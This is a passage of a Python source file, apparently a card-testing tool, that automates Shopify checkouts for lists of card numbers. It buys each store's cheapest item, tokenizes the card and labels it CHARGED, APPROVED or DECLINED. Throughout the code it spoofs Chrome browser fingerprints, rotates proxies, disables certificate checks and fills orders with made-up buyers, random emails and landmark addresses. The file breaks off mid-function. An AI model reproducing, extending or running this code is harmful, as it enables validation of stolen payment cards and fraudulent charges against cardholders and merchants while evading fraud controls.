"""
checkout_engine.py — Shopify checkout engine (inline, no external API).

Full flow per card:
  1) GET  {site}/products.json              → pick lowest in-stock variant
  2) GET  {site}/cart/{variant}:1            → create checkout, get session token
  3) GET  actions.js                         → extract persisted GraphQL IDs
  4) POST /checkouts/internal/graphql        → Proposal negotiation
  5) POST deposit/pci.shopifyinc.com         → tokenize card
  6) POST /checkouts/internal/graphql        → SubmitForCompletion
  7) GET/POST /checkouts/internal/graphql    → PollForReceipt

Public API:
  - run_checkout_public(shop_url, card, proxy_url, use_session_reuse) -> dict
  - is_proxy_alive(proxy_url, timeout) -> bool
  - ledger_clear()
  - ledger_stats() -> dict
  - CheckStatus enum, CheckResult dataclass
"""
from __future__ import annotations

import html as _html_mod
import json
import logging
import random
import re
import threading
import time
import urllib.parse
from dataclasses import dataclass
from enum import Enum
from typing import Any, Dict, List, Optional, Tuple

try:
    from curl_cffi.requests import Session as CurlSession
    CURL_CFFI_OK = True
except ImportError:
    CurlSession = None
    CURL_CFFI_OK = False

log = logging.getLogger("checkout_engine")


class CheckStatus(Enum):
    CHARGED  = "CHARGED"
    APPROVED = "APPROVED"
    DECLINED = "DECLINED"
    ERROR    = "ERROR"


@dataclass
class CheckResult:
    card: str
    status: CheckStatus
    status_code: str = ""
    amount: str = ""
    currency: str = "USD"
    site_name: str = ""
    shop_url: str = ""
    receipt_url: str = ""
    error: str = ""
    retryable: bool = False
    elapsed: float = 0.0


_BROWSER_PROFILES = ["chrome131", "chrome124", "chrome120", "chrome116", "chrome110"]

_CHROME_BRANDS = {
    "131": ('"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
            '"Google Chrome";v="131.0.6778.85", "Chromium";v="131.0.6778.85", "Not_A Brand";v="24.0.0.0"'),
    "124": ('"Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"',
            '"Chromium";v="124.0.6367.118", "Google Chrome";v="124.0.6367.118", "Not-A.Brand";v="99.0.0.0"'),
    "120": ('"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
            '"Not_A Brand";v="8.0.0.0", "Chromium";v="120.0.6099.109", "Google Chrome";v="120.0.6099.109"'),
    "116": ('"Chromium";v="116", "Not)A;Brand";v="24", "Google Chrome";v="116"',
            '"Chromium";v="116.0.5845.187", "Not)A;Brand";v="24.0.0.0", "Google Chrome";v="116.0.5845.187"'),
    "110": ('"Chromium";v="110", "Not A(Brand";v="24", "Google Chrome";v="110"',
            '"Chromium";v="110.0.5481.177", "Not A(Brand";v="24.0.0.0", "Google Chrome";v="110.0.5481.177"'),
}

_UA_WIN = {
    "131": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
    "124": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "120": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "116": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36",
    "110": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36",
}

_ACCEPT_LANG = [
    "en-US,en;q=0.9", "en-US,en;q=0.9,es;q=0.8",
    "en-US,en;q=0.9,fr;q=0.8", "en-GB,en;q=0.9",
]

POLL_MAX_ATTEMPTS  = 40
POLL_MAX_WAIT_SECS = 45.0
HTTP_SHORT = 15
HTTP_MED   = 25
HTTP_LONG  = 45


@dataclass
class _Address:
    first_name: str
    last_name: str
    address1: str
    city: str
    country_code: str
    zone_code: str
    postal_code: str
    phone: str
    email: str = ""


_ADDRESS_POOL = {
    "US": _Address("james","anderson","428 W 45th St","New York","US","NY","10036","+12125550100"),
    "CA": _Address("john","smith","200 Kent St","Ottawa","CA","ON","K1A0G9","+16135550100"),
    "GB": _Address("james","wilson","10 Downing St","London","GB","ENG","SW1A2AA","+442012345678"),
    "AU": _Address("thomas","taylor","1 George St","Sydney","AU","NSW","2000","+61212345678"),
    "DE": _Address("lucas","thomas","Friedrichstr 100","Berlin","DE","BE","10117","+493012345678"),
    "FR": _Address("hugo","bernard","10 Rue de Rivoli","Paris","FR","IDF","75001","+33112345678"),
    "NL": _Address("bas","jansen","Dam 1","Amsterdam","NL","NH","1012JS","+31201234567"),
    "IE": _Address("sean","murphy","1 Grafton St","Dublin","IE","D","D02Y006","+35311234567"),
    "SE": _Address("erik","andersson","Vasagatan 1","Stockholm","SE","AB","11120","+468123456"),
    "NO": _Address("olav","hansen","Karl Johans gate 1","Oslo","NO","03","0154","+4721234567"),
    "DK": _Address("lars","nielsen","Strøget 1","Copenhagen","DK","84","1457","+4531234567"),
    "NZ": _Address("jack","wilson","1 Queen St","Auckland","NZ","AUK","1010","+6491234567"),
    "CH": _Address("hans","weber","Bahnhofstrasse 1","Zurich","CH","ZH","8001","+41441234567"),
    "AT": _Address("markus","gruber","Stephansplatz 1","Vienna","AT","9","1010","+4312345678"),
    "BE": _Address("jan","peeters","Grote Markt 1","Brussels","BE","BRU","1000","+3221234567"),
    "FI": _Address("jussi","korhonen","Mannerheimintie 1","Helsinki","FI","18","00100","+35891234567"),
}

_FALLBACK_ORDER = ["CA","GB","AU","DE","FR","NL","IE","SE","NO","DK","NZ","CH","AT","BE","FI"]

_FIRST_NAMES = ["James","John","Robert","Michael","William","David","Mary","Patricia","Jennifer","Linda","Alex","Sam","Chris","Kai","Jamie"]
_LAST_NAMES  = ["Smith","Johnson","Williams","Brown","Jones","Garcia","Miller","Davis","Wilson","Moore","Taylor","Lee","Clark","Hall","Young"]
_EMAIL_DOMAINS = ["gmail.com","outlook.com","yahoo.com","protonmail.com","icloud.com"]


def _random_email() -> str:
    f = random.choice(_FIRST_NAMES).lower()
    l = random.choice(_LAST_NAMES).lower()
    return f"{f}.{l}{random.randint(1,9999)}@{random.choice(_EMAIL_DOMAINS)}"


def _addr_for(country_code: str) -> _Address:
    a = _ADDRESS_POOL.get(country_code, _ADDRESS_POOL["US"])
    return _Address(
        first_name=random.choice(_FIRST_NAMES).lower(),
        last_name =random.choice(_LAST_NAMES).lower(),
        address1=a.address1, city=a.city, country_code=a.country_code,
        zone_code=a.zone_code, postal_code=a.postal_code, phone=a.phone,
        email=_random_email(),
    )


def _new_fingerprint() -> dict:
    ver = random.choice(list(_CHROME_BRANDS.keys()))
    ua  = _UA_WIN[ver]
    sec_ch, sec_ch_full = _CHROME_BRANDS[ver]
    return {
        "_chrome_ver": ver,
        "ua": ua,
        "sec-ch-ua": sec_ch,
        "sec-ch-ua-full-version-list": sec_ch_full,
        "accept-language": random.choice(_ACCEPT_LANG),
    }


class _TLSClient:
    def __init__(self, proxy_url: Optional[str], fingerprint: dict, timeout: int = HTTP_MED):
        if not CURL_CFFI_OK:
            raise RuntimeError("curl_cffi not installed")
        self.fp = fingerprint
        impersonate = f"chrome{fingerprint['_chrome_ver']}"
        if impersonate not in _BROWSER_PROFILES:
            impersonate = "chrome131"
        kw = {"impersonate": impersonate, "timeout": timeout, "verify": False}
        if proxy_url:
            kw["proxy"] = proxy_url
        self.session = CurlSession(**kw)
        self.session.headers.update({
            "user-agent":                fingerprint["ua"],
            "accept-language":           fingerprint["accept-language"],
            "accept-encoding":           "gzip, deflate, br",
            "accept":                    "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
            "connection":                "keep-alive",
            "upgrade-insecure-requests": "1",
            "sec-ch-ua":                 fingerprint["sec-ch-ua"],
            "sec-ch-ua-mobile":          "?0",
            "sec-ch-ua-platform":        '"Windows"',
            "sec-fetch-dest":            "document",
            "sec-fetch-mode":            "navigate",
            "sec-fetch-site":            "none",
            "sec-fetch-user":            "?1",
            "cache-control":             "max-age=0",
        })

    def get(self, url, **kw):
        kw.setdefault("timeout", HTTP_MED)
        return self.session.get(url, **kw)

    def post(self, url, data=None, json=None, **kw):
        kw.setdefault("timeout", HTTP_MED)
        return self.session.post(url, data=data, json=json, **kw)

    def close(self):
        try:
            self.session.close()
        except Exception:
            pass


def _parse_card(entry: str) -> Tuple[str, int, int, str]:
    parts = entry.strip().replace("/", "|").split("|")
    if len(parts) != 4:
        raise ValueError("bad card format")
    num = re.sub(r"\D", "", parts[0])
    if not (13 <= len(num) <= 19):
        raise ValueError("bad card length")
    mm = int(parts[1]); yy = int(parts[2]); cvv = parts[3].strip()
    if not (1 <= mm <= 12):
        raise ValueError("bad month")
    if len(parts[2]) == 2:
        yy = 2000 + yy
    if not re.fullmatch(r"\d{3,4}", cvv):
        raise ValueError("bad cvv")
    return num, mm, yy, cvv


_RE_SESSION_TOKEN  = re.compile(r'name="serialized-sessionToken"\s+content="&quot;([^"]+)&quot;"')
_RE_SOURCE_TOKEN   = re.compile(r'name="serialized-sourceToken"\s+content="([^"]*)"')
_RE_COMMIT_SHA     = re.compile(r'"commitSha"\s*:\s*"([a-f0-9]{40})"')
_RE_STABLE_ID      = re.compile(r'"stableId"\s*:\s*"([0-9a-fA-F-]{36})"')
_RE_IDENT_SIG      = re.compile(r'checkoutCardsinkCallerIdentificationSignature"\s*:\s*"([^"]+)"')
_RE_VAULT_URL      = re.compile(r'(https://[a-zA-Z0-9._-]*(?:shopifycs|shopifyinc)\.[a-z.]+/sessions)')
_RE_ACTIONS_JS     = re.compile(r'(/cdn/shopifycloud/checkout-web/assets/c1/actions[A-Za-z0-9_-]*\.[A-Za-z0-9_-]+\.js)')
_RE_CHECKOUT_TOKEN = re.compile(r'/checkouts/cn/([^/?]+)')


def _extract_session_token(html_text: str) -> str:
    m = _RE_SESSION_TOKEN.search(html_text)
    return _html_mod.unescape(m.group(1)).strip('"') if m else ""


def _extract_vault_url(html_text: str) -> str:
    decoded = html_text.replace("&quot;", '"')
    m = _RE_VAULT_URL.search(decoded)
    if m:
        return m.group(1)
    hf = re.search(r'"hostedFields"[^}]*"url"\s*:\s*"(https://[^"]+)"', decoded)
    if hf:
        return hf.group(1).rsplit("/", 2)[0] + "/sessions"
    return ""


_RECENT_PRICES: Dict[str, List[str]] = {}
_RECENT_LOCK = threading.Lock()


def _find_cheapest_product(client: _TLSClient, shop_url: str) -> Tuple[str, str, str, str]:
    url = f"{shop_url}/products.json?limit=250"
    last_err = None
    data = None
    for attempt in range(3):
        try:
            r = client.get(url, timeout=HTTP_SHORT)
            if r.status_code == 200:
                data = r.json()
                break
            last_err = Exception(f"HTTP {r.status_code}")
        except Exception as exc:
            last_err = exc
        time.sleep(0.8 + attempt * 0.5)
    if data is None:
        raise Exception(f"products.json failed: {last_err}")

    products = data.get("products") or []
    if not products:
        raise Exception("no products")

    candidates = []
    for p in products:
        for v in p.get("variants", []):
            if v.get("available") is False:
                continue
            try:
                price = float(v.get("price") or 0)
            except (ValueError, TypeError):
                continue
            if price < 0.10:
                continue
            candidates.append({
                "variant_id": str(v["id"]),
                "title":      p.get("title", ""),
                "price":      v.get("price", ""),
                "price_f":    price,
            })
    if not candidates:
        raise Exception("no available variants")

    candidates.sort(key=lambda x: x["price_f"])
    domain = urllib.parse.urlparse(shop_url).hostname or shop_url
    with _RECENT_LOCK:
        recent = _RECENT_PRICES.get(domain, [])
    top = candidates[:min(5, len(candidates))]
    preferred = [c for c in top if c["price"] not in recent] or top
    pick = random.choice(preferred)
    with _RECENT_LOCK:
        _RECENT_PRICES[domain] = (recent + [pick["price"]])[-5:]

    return pick["title"], pick["variant_id"], pick["variant_id"], pick["price"]


def _add_to_cart(client: _TLSClient, shop_url: str, variant_id: str) -> Tuple[str, str, str, str]:
    cart_url = f"{shop_url}/cart/{variant_id}:1"
    r = client.get(cart_url, allow_redirects=True, headers={
        "accept":  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
        "referer": shop_url + "/",
        "sec-fetch-dest": "document",
        "sec-fetch-mode": "navigate",
        "sec-fetch-site": "same-origin",
        "sec-fetch-user": "?1",
    })
    if r.status_code not in (200, 302):
        raise Exception(f"cart permalink {r.status_code}")
    checkout_url = str(r.url)
    html_text    = r.text
    token_m      = _RE_CHECKOUT_TOKEN.search(checkout_url)
    checkout_token = token_m.group(1) if token_m else ""
    session_token  = _extract_session_token(html_text)
    return checkout_url, checkout_token, session_token, html_text


_RE_PROPOSAL_ID = re.compile(r'id:\s*"([a-f0-9]{64})"\s*,\s*type:\s*"query"\s*,\s*name:\s*"Proposal"')
_RE_SUBMIT_ID   = re.compile(r'id:\s*"([a-f0-9]{64})"\s*,\s*type:\s*"mutation"\s*,\s*name:\s*"SubmitForCompletion"')
_RE_POLL_ID     = re.compile(r'id:\s*"([a-f0-9]{64})"\s*,\s*type:\s*"query"\s*,\s*name:\s*"PollForReceipt"')


def _fetch_persisted_ids(client: _TLSClient, checkout_html: str, shop_url: str) -> Dict[str, str]:
    m = _RE_ACTIONS_JS.search(checkout_html)
    if not m:
        return {}
    try:
        r = client.get(shop_url + m.group(1), timeout=HTTP_SHORT)
        if r.status_code != 200:
            return {}
        js = r.text
    except Exception:
        return {}
    out = {}
    for key, pat in (("proposal", _RE_PROPOSAL_ID), ("submit", _RE_SUBMIT_ID), ("poll", _RE_POLL_ID)):
        mm = pat.search(js)
        if mm:
            out[key] = mm.group(1)
    return out


# ── GraphQL query strings ──────────────────────────────────────────────────
Q_PROPOSAL = """query Proposal($delivery:DeliveryTermsInput,$discounts:DiscountTermsInput,$payment:PaymentTermInput,$merchandise:MerchandiseTermInput,$buyerIdentity:BuyerIdentityTermInput,$taxes:TaxTermInput,$sessionInput:SessionTokenInput!,$checkpointData:String,$queueToken:String,$tip:TipTermInput,$note:NoteInput,$localizationExtension:LocalizationExtensionInput,$nonNegotiableTerms:NonNegotiableTermsInput,$scriptFingerprint:ScriptFingerprintInput,$optionalDuties:OptionalDutiesInput,$poNumber:String){session(sessionInput:$sessionInput){negotiate(input:{purchaseProposal:{delivery:$delivery,discounts:$discounts,payment:$payment,merchandise:$merchandise,buyerIdentity:$buyerIdentity,taxes:$taxes,tip:$tip,note:$note,poNumber:$poNumber,nonNegotiableTerms:$nonNegotiableTerms,localizationExtension:$localizationExtension,scriptFingerprint:$scriptFingerprint,optionalDuties:$optionalDuties},checkpointData:$checkpointData,queueToken:$queueToken}){__typename result{...on NegotiationResultAvailable{checkpointData queueToken sellerProposal{...ProposalDetails __typename}__typename}...on CheckpointDenied{redirectUrl __typename}...on Throttled{pollAfter queueToken pollUrl __typename}...on SubmittedForCompletion{receipt{...ReceiptDetails __typename}__typename}...on NegotiationResultFailed{__typename}__typename}errors{code localizedMessage nonLocalizedMessage __typename}}__typename}}fragment ProposalDetails on Proposal{delivery{...on FilledDeliveryTerms{deliveryLines{destinationAddress{...on StreetAddress{firstName lastName address1 city countryCode zoneCode postalCode phone __typename}...on PartialStreetAddress{firstName lastName address1 city countryCode zoneCode postalCode phone __typename}__typename}targetMerchandise{linesV2{...on MerchandiseLine{stableId __typename}__typename}__typename}groupType deliveryMethodTypes selectedDeliveryStrategy{...on CompleteDeliveryStrategy{handle __typename}...on DeliveryStrategyReference{handle __typename}__typename}availableDeliveryStrategies{...on CompleteDeliveryStrategy{handle title amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}__typename}...on PendingTerms{pollDelay taskId __typename}__typename}payment{...on FilledPaymentTerms{availablePaymentLines{paymentMethod{...on PaymentProvider{paymentMethodIdentifier name orderingIndex __typename}__typename}__typename}__typename}__typename}merchandise{...on FilledMerchandiseTerms{merchandiseLines{stableId quantity{...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}__typename}__typename}__typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}runningTotal{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}total{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotal{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}tax{...on FilledTaxTerms{totalTaxAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}...on PendingTerms{pollDelay __typename}__typename}isShippingRequired __typename}fragment ReceiptDetails on Receipt{...on ProcessedReceipt{id token redirectUrl orderIdentity{id __typename}__typename}...on ProcessingReceipt{id pollDelay __typename}...on ActionRequiredReceipt{id __typename}...on FailedReceipt{id processingError{...on PaymentFailed{code messageUntranslated __typename}__typename}__typename}__typename}"""

Q_SUBMIT = """mutation SubmitForCompletion($input:NegotiationInput!,$attemptToken:String!,$metafields:[MetafieldInput!],$analytics:AnalyticsInput){submitForCompletion(input:$input attemptToken:$attemptToken metafields:$metafields analytics:$analytics){...on SubmitSuccess{receipt{...ReceiptDetails __typename}__typename}...on SubmitAlreadyAccepted{receipt{...ReceiptDetails __typename}__typename}...on SubmitFailed{reason __typename}...on SubmitRejected{errors{...on NegotiationError{code localizedMessage nonLocalizedMessage __typename}__typename}__typename}...on Throttled{pollAfter pollUrl queueToken __typename}...on CheckpointDenied{redirectUrl __typename}...on SubmittedForCompletion{receipt{...ReceiptDetails __typename}__typename}__typename}}fragment ReceiptDetails on Receipt{...on ProcessedReceipt{id token redirectUrl orderIdentity{id __typename}__typename}...on ProcessingReceipt{id pollDelay __typename}...on ActionRequiredReceipt{id __typename}...on FailedReceipt{id processingError{...on PaymentFailed{code messageUntranslated __typename}__typename}__typename}__typename}"""

Q_POLL = """query PollForReceipt($receiptId:ID!,$sessionToken:String!){receipt(receiptId:$receiptId,sessionInput:{sessionToken:$sessionToken}){...ReceiptDetails __typename}}fragment ReceiptDetails on Receipt{...on ProcessedReceipt{id token redirectUrl confirmationPage{url __typename}orderIdentity{id __typename}__typename}...on ProcessingReceipt{id pollDelay __typename}...on WaitingReceipt{id pollDelay __typename}...on ActionRequiredReceipt{id action{...on CompletePaymentChallenge{offsiteRedirect url __typename}__typename}__typename}...on FailedReceipt{id processingError{...on PaymentFailed{code messageUntranslated __typename}...on InventoryReservationFailure{__typename}...on InventoryClaimFailure{__typename}__typename}__typename}__typename}"""


def _tokenize_card(client: _TLSClient, ident_sig: str, card_number: str,
                    card_name: str, month: int, year: int, cvv: str,
                    scope: str, vault_url: str) -> Tuple[str, str]:
    if not vault_url:
        vault_url = "https://checkout.pci.shopifyinc.com/sessions"
    origin = vault_url.rsplit("/sessions", 1)[0]
    headers = {
        "accept":                     "application/json",
        "content-type":               "application/json",
        "origin":                     origin,
        "referer":                    f"{origin}/build/a8e4a94/number-ltr.html?identifier=&locationURL=",
        "sec-fetch-dest":             "empty",
        "sec-fetch-mode":             "cors",
        "sec-fetch-site":             "same-origin",
        "sec-fetch-storage-access":   "active",
        "shopify-identification-signature": ident_sig,
        "user-agent":                 client.fp["ua"],
    }
    payload = {
        "credit_card": {
            "number":             card_number,
            "month":              month,
            "year":               year,
            "verification_value": cvv,
            "start_month":        None,
            "start_year":         None,
            "issue_number":       "",
            "name":               card_name,
        },
        "payment_session_scope": scope,
    }
    try:
        r = client.post(vault_url, json=payload, headers=headers, timeout=HTTP_SHORT)
    except Exception as exc:
        return "", f"vault_exc: {exc}"
    if r.status_code != 200:
        return "", f"vault_http_{r.status_code}"
    try:
        return r.json().get("id", ""), ""
    except Exception:
        return "", "vault_bad_json"


def _proposal_headers(client: _TLSClient, shop_url: str, checkout_url: str,
                       checkout_token: str, session_token: str,
                       build_id: str, source_token: str, source_id: str = "") -> dict:
    h = {
        "accept": "application/json",
        "content-type": "application/json",
        "origin": shop_url,
        "referer": checkout_url,
        "sec-ch-ua": client.fp["sec-ch-ua"],
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-origin",
        "shopify-checkout-client": "checkout-web/1.0",
        "shopify-checkout-source": f'id="{checkout_token}", type="cn"',
        "user-agent": client.fp["ua"],
        "x-checkout-one-session-token": session_token,
        "x-checkout-web-deploy-stage": "production",
        "x-checkout-web-server-handling": "fast",
        "x-checkout-web-server-rendering": "yes",
        "x-checkout-web-source-id": source_id or source_token or checkout_token,
    }
    if build_id:
        h["x-checkout-web-build-id"] = build_id
    return h


def _patch_currency_country(payload: Any, currency: str, country: str) -> Any:
    def walk(node):
        if isinstance(node, dict):
            out = {}
            for k, v in node.items():
                if k == "presentmentCurrency" and v == "USD" and currency != "USD":
                    out[k] = currency
                elif k == "phoneCountryCode" and v == "US" and country != "US":
                    out[k] = country
                else:
                    out[k] = walk(v)
            return out
        if isinstance(node, list):
            return [walk(x) for x in node]
        return node
    return walk(payload)


def _proposal_payload(session_token: str, stable_id: str, variant_id: str,
                       queue_token: str, email, addr, is_shipping: bool,
                       currency: str, country: str) -> dict:
    if is_shipping:
        delivery_line = {
            "destination": {
                "partialStreetAddress": {
                    "address1":    addr.address1     if addr else "",
                    "address2":    "",
                    "city":        addr.city         if addr else "",
                    "countryCode": addr.country_code if addr else country,
                    "postalCode":  addr.postal_code  if addr else "",
                    "firstName":   addr.first_name   if addr else "",
                    "lastName":    addr.last_name    if addr else "",
                    "zoneCode":    addr.zone_code    if addr else "",
                    "phone":       addr.phone        if addr else "",
                    "oneTimeUse":  False,
                },
            },
            "selectedDeliveryStrategy": {
                "deliveryStrategyMatchingConditions": {
                    "estimatedTimeInTransit": {"any": True},
                    "shipments":              {"any": True},
                },
                "options": {},
            },
            "targetMerchandiseLines": {"any": True},
            "deliveryMethodTypes": ["SHIPPING"],
            "expectedTotalPrice": {"any": True},
            "destinationChanged": True,
        }
    else:
        delivery_line = {
            "selectedDeliveryStrategy": {
                "deliveryStrategyMatchingConditions": {
                    "estimatedTimeInTransit": {"any": True},
                    "shipments":              {"any": True},
                },
                "options": {},
            },
            "targetMerchandiseLines": {"any": True},
            "deliveryMethodTypes": ["NONE"],
            "expectedTotalPrice": {"any": True},
            "destinationChanged": True,
        }

    buyer = {
        "customer":          {"presentmentCurrency": currency, "countryCode": country},
        "phoneCountryCode":  country,
        "marketingConsent":  [],
        "shopPayOptInPhone": {"countryCode": country},
        "rememberMe":        False,
    }
    if email:
        buyer["email"] = email
        buyer["emailChanged"] = True

    return {
        "sessionInput": {"sessionToken": session_token},
        "queueToken":   queue_token or "",
        "discounts":    {"lines": [], "acceptUnexpectedDiscounts": True},
        "delivery": {
            "deliveryLines": [delivery_line],
            "noDeliveryRequired": [],
            "useProgressiveRates": False,
            "prefetchShippingRatesStrategy": None,
            "supportsSplitShipping": True,
        },
        "deliveryExpectations": {"deliveryExpectationLines": []},
        "merchandise": {
            "merchandiseLines": [{
                "stableId": stable_id,
                "merchandise": {
                    "productVariantReference": {
                        "id":               f"gid://shopify/ProductVariantMerchandise/{variant_id}",
                        "variantId":        f"gid://shopify/ProductVariant/{variant_id}",
                        "properties":       [],
                        "sellingPlanId":    None,
                        "sellingPlanDigest":None,
                    },
                },
                "quantity":            {"items": {"value": 1}},
                "expectedTotalPrice":  {"any": True},
                "lineComponentsSource":None,
                "lineComponents":      [],
            }],
        },
        "memberships": {"memberships": []},
        "payment": {
            "totalAmount": {"any": True},
            "paymentLines": [],
            "billingAddress": {
                "streetAddress": {
                    "address1":    addr.address1     if addr else "",
                    "address2":    "",
                    "city":        addr.city         if addr else "",
                    "countryCode": addr.country_code if addr else country,
                    "postalCode":  addr.postal_code  if addr else "",
                    "firstName":   addr.first_name   if addr else "",
                    "lastName":    addr.last_name    if addr else "",
                    "zoneCode":    addr.zone_code    if addr else "",
                    "phone":       addr.phone        if addr else "",
                },
            },
        },
        "buyerIdentity": buyer,
        "tip":           {"tipLines": []},
        "poNumber":      None,
        "taxes": {
            "proposedAllocations": None,
            "proposedTotalAmount": {"any": True},
            "proposedTotalIncludedAmount": None,
            "proposedMixedStateTotalAmount": None,
            "proposedExemptions": [],
        },
        "note":                  {"message": None, "customAttributes": []},
        "localizationExtension": {"fields": []},
        "nonNegotiableTerms":    None,
        "scriptFingerprint": {
            "signature": None, "signatureUuid": None,
            "lineItemScriptChanges": [], "paymentScriptChanges": [], "shippingScriptChanges": [],
        },
        "optionalDuties": {"buyerRefusesDuties": False},
        "cartMetafields": [],
    }


def _post_graphql(client: _TLSClient, shop_url: str, headers: dict,
                   operation: str, variables: dict, persisted_id: str = "",
                   raw_query: str = "", timeout: int = HTTP_MED) -> Tuple[int, str]:
    def _is_edge_err(text: str) -> bool:
        t = text or ""
        return '"errors":"' in t and '"errors":[{"' not in t and '"errors": [{' not in t

    if persisted_id:
        body_p = json.dumps({
            "variables":     variables,
            "operationName": operation,
            "id":            persisted_id,
        }, separators=(",", ":"))
        try:
            r = client.post(
                f"{shop_url}/checkouts/internal/graphql/persisted?operationName={operation}",
                data=body_p, headers=headers, timeout=timeout)
            if r.status_code == 200 and not _is_edge_err(r.text) and '"data"' in (r.text or ""):
                return r.status_code, r.text
        except Exception:
            pass

    if raw_query:
        body_q = json.dumps({
            "query":         raw_query,
            "variables":     variables,
            "operationName": operation,
        }, separators=(",", ":"))
        try:
            r = client.post(
                f"{shop_url}/checkouts/unstable/graphql",
                data=body_q, headers=headers, timeout=timeout)
            if r.status_code == 200 and not _is_edge_err(r.text) and '"data"' in (r.text or ""):
                return r.status_code, r.text
        except Exception:
            pass

        try:
            r = client.post(
                f"{shop_url}/checkouts/internal/graphql",
                data=body_q, headers=headers, timeout=timeout)
            return r.status_code, r.text
        except Exception as e:
            return 0, str(e)

    return 0, '{"errors":"no query provided"}'


def _send_proposal(client, shop_url, checkout_url, checkout_token, session_token,
                    stable_id, variant_id, queue_token, email, addr, is_shipping,
                    currency, country, proposal_id, build_id, source_token):
    variables = _proposal_payload(session_token, stable_id, variant_id,
                                   queue_token, email, addr, is_shipping,
                                   currency, country)
    variables = _patch_currency_country(variables, currency, country)
    headers = _proposal_headers(client, shop_url, checkout_url, checkout_token,
                                 session_token, build_id, source_token)
    return _post_graphql(client, shop_url, headers, "Proposal", variables,
                          persisted_id=proposal_id, raw_query=Q_PROPOSAL,
                          timeout=HTTP_MED)


def _extract_signed_handles(proposal_json: str) -> List[str]:
    try:
        data = json.loads(proposal_json)
        seller = (data.get("data", {}).get("session", {}).get("negotiate", {})
                       .get("result", {}).get("sellerProposal", {}))
        de = seller.get("deliveryExpectations", {})
        expectations = de.get("deliveryExpectations", [])
        out = []
        if isinstance(expectations, list):
            for x in expectations:
                h = x.get("signedHandle") or x.get("deliveryOptionHandle") or x.get("deliveryStrategyHandle")
                if h:
                    out.append(h)
        return out
    except Exception:
        return []


def _extract_delivery_handle(proposal_json: str) -> str:
    try:
        data = json.loads(proposal_json)
        seller = (data.get("data", {}).get("session", {}).get("negotiate", {})
                       .get("result", {}).get("sellerProposal", {}))
        dlv = seller.get("delivery", {})
        h = dlv.get("selectedDeliveryStrategy", {}).get("handle", "")
        if h:
            return h
        for line in dlv.get("deliveryLines", []):
            for macro in line.get("deliveryMacros", []):
                for sh in macro.get("deliveryStrategyHandles", []):
                    return sh
    except Exception:
        pass
    return ""


def _extract_total(proposal_json: str) -> str:
    try:
        data = json.loads(proposal_json)
        seller = (data.get("data", {}).get("session", {}).get("negotiate", {})
                       .get("result", {}).get("sellerProposal", {}))
        for key in ("checkoutTotal", "total", "runningTotal"):
            val = seller.get(key, {}).get("value", {}).get("amount")
            if val:
                return val
    except Exception:
        pass
    return ""


def _extract_tax(proposal_json: str) -> str:
    try:
        data = json.loads(proposal_json)
        seller = (data.get("data", {}).get("session", {}).get("negotiate", {})
                       .get("result", {}).get("sellerProposal", {}))
        val = seller.get("tax", {}).get("totalTaxAmount", {}).get("value", {}).get("amount")
        if val:
            return val
    except Exception:
        pass
    return "0.0"


def _extract_is_shipping(proposal_json: str) -> bool:
    try:
        data = json.loads(proposal_json)
        seller = (data.get("data", {}).get("session", {}).get("negotiate", {})
                       .get("result", {}).get("sellerProposal", {}))
        return bool(seller.get("isShippingRequired", True))
    except Exception:
        return True


def _receipt_id(body: str) -> str:
    m = re.search(r'"id"\s*:\s*"(gid://shopify/\w*Receipt/[A-Za-z0-9_-]+)"', body)
    return m.group(1) if m else ""


def _receipt_session_token(body: str) -> str:
    m = re.search(r'"sessionToken"\s*:\s*"([^"]+)"', body)
    return m.group(1) if m else ""


def _send_submit(client, shop_url, checkout_url, checkout_token, session_token,
                  stable_id, variant_id, queue_token, email, addr,
                  delivery_handle, signed_handles, total, tax, pci_session_id,
                  attempt_token, currency, country, is_shipping,
                  submit_id, build_id, source_token):
    page_id = f"{random.getrandbits(64):016x}"

    if is_shipping:
        delivery = {
            "deliveryLines": [{
                "destination": {
                    "streetAddress": {
                        "address1":    addr.address1,
                        "address2":    "",
                        "city":        addr.city,
                        "countryCode": addr.country_code,
                        "postalCode":  addr.postal_code,
                        "firstName":   addr.first_name,
                        "lastName":    addr.last_name,
                        "zoneCode":    addr.zone_code,
                        "phone":       addr.phone,
                        "oneTimeUse":  False,
                    },
                },
                "selectedDeliveryStrategy": {
                    "deliveryStrategyByHandle": {
                        "handle":             delivery_handle,
                        "customDeliveryRate": False,
                    },
                    "options": {},
                },
                "targetMerchandiseLines": {"lines": [{"stableId": stable_id}]},
                "deliveryMethodTypes": ["SHIPPING"],
                "expectedTotalPrice": {"any": True},
                "destinationChanged": False,
            }],
            "noDeliveryRequired": [],
            "useProgressiveRates": False,
            "prefetchShippingRatesStrategy": None,
            "supportsSplitShipping": True,
        }
        expectations = [{"signedHandle": h} for h in signed_handles]
    else:
        delivery = {
            "deliveryLines": [{
                "selectedDeliveryStrategy": {
                    "deliveryStrategyMatchingConditions": {
